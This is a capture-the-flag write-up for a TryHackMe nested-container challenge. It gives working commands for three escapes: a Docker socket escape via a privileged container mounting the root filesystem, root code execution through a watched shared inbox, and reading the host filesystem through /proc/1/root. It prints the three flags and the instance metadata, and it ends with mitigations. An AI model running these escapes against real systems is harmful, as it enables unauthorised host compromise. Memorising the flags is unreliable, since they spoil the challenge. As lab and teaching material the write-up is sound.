# Matryoshka Containment Unit — CTF Writeup

**Challenge**: Escape the Matryoshka Containment Unit  
**Platform**: TryHackMe  
**Category**: Docker / Container Escape  
**Flags**: 3 (`THM{RUN@W@Y_S0CK3T}`, `THM{RW_B1ND3D}`, `THM{SP@C3D_0UT}`)

---

## Overview

The challenge presents a **nested container (Matryoshka) architecture** where the player starts with SSH access to an inner container and must escape through multiple layers to reach the host machine and collect three flags:

1. **Level 2 Flag** — Inside the Docker-in-Docker (DinD) container
2. **Level 3 Flag** — Inside the containerd-managed container that hosts the DinD
3. **Host Flag** — On the real underlying host filesystem

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│  REAL HOST (Ubuntu, /dev/nvme0n1p1)                         │
│  └── /root/flag_host.txt  →  THM{SP@C3D_0UT}               │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  Layer 3: containerd container (matryoshka-level2) │   │
│  │  └── /root/flag_level3.txt  →  THM{RW_B1ND3D}     │   │
│  │                                                     │   │
│  │  ┌─────────────────────────────────────────────┐   │   │
│  │  │  Layer 2: DinD container (dockerd + vfs)    │   │   │
│  │  │  └── /root/flag_level2.txt → THM{RUN@W@Y_…}│   │   │
│  │  │                                             │   │   │
│  │  │  ┌─────────────────────────────────────┐   │   │   │
│  │  │  │  Layer 1: SSH entry container       │   │   │   │
│  │  │  │  (matryoshka-level1:local)          │   │   │   │
│  │  │  │  User: matryoshka                   │   │   │   │
│  │  │  └─────────────────────────────────────┘   │   │   │
│  │  └─────────────────────────────────────────────┘   │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## Phase 1: Reconnaissance (Layer 1)

After SSHing in, we land as user `matryoshka` in a container.

### Initial Recon Commands

```bash
whoami && id && uname -a && hostname
# matryoshka
# uid=1000(matryoshka) gid=1000(matryoshka) groups=1000(matryoshka)
# Linux ace17fc14ca8 6.17.0-1013-aws ... x86_64 GNU/Linux
```

```bash
cat /proc/1/sched | head -n 5
# sleep (1, #threads: 1)          ← PID 1 is `sleep infinity` → Docker container
```

```bash
ls -la /.dockerenv
# -rwxr-xr-x 1 root root 0 May  9 06:04 /.dockerenv   ← Confirms Docker container
```

```bash
cat /proc/self/status | grep Cap
# CapInh:	0000000000000000
# CapPrm:	0000000000000000
# CapEff:	0000000000000000
# CapBnd:	00000000a80425fb    ← Bounding set allows SYS_CHROOT, SETUID, etc.
```

**Key Finding**: The container has a **Docker socket** mounted:

```bash
ls -la /var/run/docker.sock
# srw-rw-rw- 1 root 2375 0 May  9 06:04 /var/run/docker.sock
```

This is the classic **Docker socket escape** vector.

---

## Phase 2: Escape Layer 1 → Layer 2

### Step 2.1: Verify Docker Access

```bash
docker -H unix:///var/run/docker.sock ps
# CONTAINER ID   IMAGE                     COMMAND                  CREATED        STATUS        PORTS     NAMES
# ace17fc14ca8   matryoshka-level1:local   "sh -lc 'sleep infin…"   57m ago      Up 57m                  level1
```

### Step 2.2: Check Available Images

```bash
docker -H unix:///var/run/docker.sock images
# REPOSITORY          TAG       IMAGE ID       CREATED       SIZE
# matryoshka-level1   local     485e908211ec   4 days ago    43.9MB
# alpine              3.20      bf8527eb54c3   3 weeks ago   7.8MB
```

`alpine:3.20` is available locally (no internet access in the container).

### Step 2.3: Spawn Privileged Container with Host FS Mounted

```bash
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host --privileged alpine:3.20 chroot /host sh
```

**Why this works**:
- `-v /:/host` mounts the **Layer 2 container's root filesystem** into `/host`
- `--privileged` grants full capabilities, allowing `chroot` to work
- `chroot /host sh` changes root to the Layer 2 filesystem

### Step 2.4: Grab Level 2 Flag

```bash
id
# uid=0(root) gid=0(root) ...

cd /root
ls
# flag_level2.txt

cat flag_level2.txt
# THM{RUN@W@Y_S0CK3T}
```

---

## Phase 3: Reconnaissance (Layer 2)

Now we're root in Layer 2 — a **Docker-in-Docker (DinD)** container.

```bash
whoami && id && hostname && uname -a
# root
# uid=0(root) gid=0(root) ...
# 3dea8f2a8c34
# Linux 3dea8f2a8c34 6.17.0-1013-aws ...
```

```bash
ps auxf
# PID   USER     TIME  COMMAND
#     1 root      0:00 {level2-entrypoi} /bin/sh /usr/local/bin/level2-entrypoint.sh
#     7 root      0:00 docker-init -- dockerd --host=unix:///var/run/docker.sock --host=tcp://0.0.0.0:2376 ...
#   137 root      0:04 dockerd --host=unix:///var/run/docker.sock ...
#   145 root      0:07 containerd --config /var/run/docker/containerd/containerd.toml
```

**Key Finding**: Layer 2 runs its **own Docker daemon** (DinD). The socket is world-writable by design (the challenge vulnerability).

Reading the setup script reveals the architecture:

```bash
cat /usr/local/bin/level2-entrypoint.sh
```

Key lines:
```bash
# Level 1 -> Level 2 vuln: make the daemon socket world-writable
chmod 666 /var/run/docker.sock

# Create Level 2 flag
echo "$LEVEL2_FLAG" > /root/flag_level2.txt

# Start Level 1 container with socket mounted IN
docker run -d --name level1   -v /var/run/docker.sock:/var/run/docker.sock   matryoshka-level1:local
```

**Key Finding**: `/mnt/level3share` exists with `inbox/` and `outbox/`:

```bash
ls -la /mnt/level3share
# drwxrwxrwx 4 root root 4096 May  9 06:03 .
# drwxr-xr-x 1 root root 4096 May  9 06:04 ..
# drwxrwxrwx 2 root root 4096 May  9 06:03 inbox
# drwxrwxrwx 2 root root 4096 May  9 06:03 outbox
```

This is the **bridge to Layer 3**.

---

## Phase 4: Escape Layer 2 → Layer 3

### Step 4.1: Understand the Inbox/Outbox Mechanism

The hint says: *"Look for an Inbox folder that allows script executions."*

We test by dropping a script in `inbox/` and checking `outbox/`:

```bash
cat > /mnt/level3share/inbox/test.sh << 'EOF'
#!/bin/sh
id
whoami
hostname
EOF
chmod +x /mnt/level3share/inbox/test.sh

sleep 5
cat /mnt/level3share/outbox/test.sh.out
```

Output:
```
/tmp/runner_test.sh: line 2: can't create /mnt/level3share/outbox/result.txt: nonexistent directory
```

**Key Insight**: Scripts are **copied to `/tmp/runner_<name>.sh`** and executed there. **Stdout/stderr is captured** to `.out` files. We cannot write directly to `/mnt/level3share/outbox/` from within the script — but we can read files and output them to stdout.

### Step 4.2: Full Recon of Layer 3

```bash
cat > /mnt/level3share/inbox/recon.sh << 'EOF'
#!/bin/sh
echo "=== ID ==="
id
whoami
echo "=== DOCKER ==="
docker ps -a
docker images
echo "=== FLAGS ==="
find / -maxdepth 3 -name "*flag*" -o -name "*FLAG*" 2>/dev/null | grep -v kpageflags | grep -v proc
echo "=== ROOT ==="
ls -la /root/ 2>/dev/null
echo "=== ENV ==="
env
echo "=== HOSTNAME ==="
hostname
EOF
chmod +x /mnt/level3share/inbox/recon.sh

sleep 5
cat /mnt/level3share/outbox/recon.sh.out
```

**Critical Output**:
```
=== ID ===
uid=0(root) gid=0(root) groups=0(root)...
root
=== DOCKER ===
CONTAINER ID   IMAGE                     COMMAND                  CREATED         STATUS         PORTS           NAMES
32735c381031   matryoshka-level2:local   "/usr/local/bin/leve…"   2 hours ago     Up 2 hours     2375-2376/tcp   level2
... (other instances)
=== FLAGS ===
/root/flag_level3.txt
=== ROOT ===
total 12
drwx------ 1 root root 4096 May  9 06:03 .
drwxr-xr-x 1 root root 4096 May  9 06:03 ..
-r-------- 1 root root   15 May  9 06:03 flag_level3.txt
=== ENV ===
...
LEVEL3_FLAG=THM{RW_B1ND3D}
...
=== HOSTNAME ===
ba3e587fea6e
```

### Step 4.3: Grab Level 3 Flag

```bash
cat > /mnt/level3share/inbox/readflag.sh << 'EOF'
#!/bin/sh
cat /root/flag_level3.txt
EOF
chmod +x /mnt/level3share/inbox/readflag.sh

sleep 5
cat /mnt/level3share/outbox/readflag.sh.out
# THM{RW_B1ND3D}
```

---

## Phase 5: Escape Layer 3 → Real Host

Layer 3 (`ba3e587fea6e`) is itself a container managed by **containerd** on the real host. We need to find the **Host Flag**.

### Step 5.1: Recon the Real Host via `/proc/1/root/`

Since Layer 3 scripts run as **root**, we can access `/proc/1/root/` which exposes the **real host's root filesystem**:

```bash
cat > /mnt/level3share/inbox/hostescape.sh << 'EOF'
#!/bin/sh
echo "=== HOSTNAME ==="
hostname
echo "=== DOCKER SOCK ==="
ls -la /var/run/docker.sock
echo "=== DOCKER PS ==="
docker ps -a
echo "=== FIND FLAGS ==="
find / -maxdepth 3 -name "*flag*" -o -name "*FLAG*" 2>/dev/null | grep -v kpageflags | grep -v proc
echo "=== ROOT ==="
ls -la /root/
echo "=== PROC 1 ROOT ==="
ls -la /proc/1/root/ | head -20
echo "=== MOUNTS ==="
mount | grep -E "docker|overlay|level3" | head -5
EOF
chmod +x /mnt/level3share/inbox/hostescape.sh

sleep 5
cat /mnt/level3share/outbox/hostescape.sh.out
```

**Critical Output**:
```
=== PROC 1 ROOT ===
total 10516
drwxr-xr-x  22 root root     4096 May  9 06:03 .
drwxr-xr-x  22 root root     4096 May  9 06:03 ..
-rw-r--r--   1 root root      168 May  9 06:03 .badr-info
lrwxrwxrwx   1 root root        7 Oct 26  2020 bin -> usr/bin
drwxr-xr-x   2 root root     4096 Mar 31  2024 bin.usr-is-merged
...
/dev/nvme0n1p1 on /var/lib/docker type ext4 (rw,relatime,discard)
```

**Key Insight**: `/proc/1/root/` shows:
- A **real Ubuntu host** (not a container — has `bin.usr-is-merged`, real block device `/dev/nvme0n1p1`)
- `.badr-info` file (TryHackMe instance metadata)
- The host's `/var/lib/docker` is mounted from a real disk partition

### Step 5.2: Grab the Host Flag

```bash
cat > /mnt/level3share/inbox/gethostflag.sh << 'EOF'
#!/bin/sh
echo "=== HOST FLAGS ==="
find /proc/1/root/ -maxdepth 3 -name "*flag*" -o -name "*FLAG*" 2>/dev/null | grep -v kpageflags
echo "=== HOST ROOT FLAG ==="
cat /proc/1/root/root/flag* 2>/dev/null
cat /proc/1/root/home/*/flag* 2>/dev/null
echo "=== BADR INFO ==="
cat /proc/1/root/.badr-info 2>/dev/null
EOF
chmod +x /mnt/level3share/inbox/gethostflag.sh

sleep 5
cat /mnt/level3share/outbox/gethostflag.sh.out
```

**Output**:
```
=== HOST FLAGS ===
/proc/1/root/root/flag_host.txt
=== HOST ROOT FLAG ===
THM{SP@C3D_0UT}
=== BADR INFO ===
userId: 5f64f04760fd757d097e808a
uploadId: 69fd7ed6c61862ee32ddca9a
roomId: 6964c14761438f6e415ab870
roomCode: matryoshka
instanceId: 69fecdf144e985c7a883febd
```

---

## Flags Summary

| Flag | Location | Value | Escape Method |
|------|----------|-------|---------------|
| **Level 2** | `/root/flag_level2.txt` (DinD container) | `THM{RUN@W@Y_S0CK3T}` | Docker socket escape |
| **Level 3** | `/root/flag_level3.txt` (containerd container) | `THM{RW_B1ND3D}` | Inbox script execution |
| **Host** | `/root/flag_host.txt` (Real Ubuntu host) | `THM{SP@C3D_0UT}` | `/proc/1/root/` access from Layer 3 |

---

## Vulnerability Analysis

### Layer 1 → Layer 2: Docker Socket Mount + World-Writable

The `level2-entrypoint.sh` intentionally creates the vulnerability:

```bash
chmod 666 /var/run/docker.sock
```

This allows any user in the level1 container to interact with the Layer 2 Docker daemon. Since the socket is mounted into level1, a low-privilege user (`matryoshka`) can spawn privileged containers on Layer 2.

**Mitigation**: Never mount Docker sockets into untrusted containers. Use Docker socket proxies with strict ACLs.

### Layer 2 → Layer 3: Shared Inbox with Arbitrary Script Execution

The `/mnt/level3share/inbox/` directory is a shared volume between Layer 2 and Layer 3. The Layer 3 host runs a watcher that:
1. Copies scripts from `inbox/` to `/tmp/runner_<name>.sh`
2. Executes them
3. Captures output to `outbox/<name>.sh.out`
4. Deletes the original script

This is essentially an **arbitrary code execution** as root on Layer 3.

**Mitigation**: Validate/script sandbox inbox contents. Use read-only shares where possible.

### Layer 3 → Host: `/proc/1/root/` Exposure

Since Layer 3 scripts run as **root**, they can access `/proc/1/root/` which exposes the **real host filesystem** (the containerd host). This is a standard container breakout when running as root with access to the host's procfs.

**Mitigation**: Run containers with reduced privileges. Use user namespaces (`userns-remap`). Restrict `/proc` and `/sys` access.

---

## Tools & Commands Reference

### Docker Socket Escape
```bash
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host --privileged alpine:3.20 chroot /host sh
```

### Inbox/Outbox Exploitation
```bash
# Atomic write + chmod (script gets deleted quickly)
cat > /mnt/level3share/inbox/recon.sh << 'EOF'
#!/bin/sh
id
whoami
hostname
EOF
chmod +x /mnt/level3share/inbox/recon.sh

sleep 5
cat /mnt/level3share/outbox/recon.sh.out
```

### Host Filesystem Access from Container
```bash
# Read host root via PID 1
cat /proc/1/root/etc/hostname
ls -la /proc/1/root/root/
cat /proc/1/root/root/flag_host.txt
```

---

## Conclusion

The Matryoshka Containment Unit is a beautifully layered challenge that demonstrates **nested container escapes**. Each layer exposes a different vulnerability:

1. **Docker socket mount** → classic container escape
2. **Shared inbox with arbitrary execution** → lateral movement between containers
3. **`/proc/1/root/` access as root** → final host compromise

The challenge name "Matryoshka" (Russian nesting dolls) perfectly describes the architecture — containers within containers, each requiring a different escape technique to crack open the next layer.
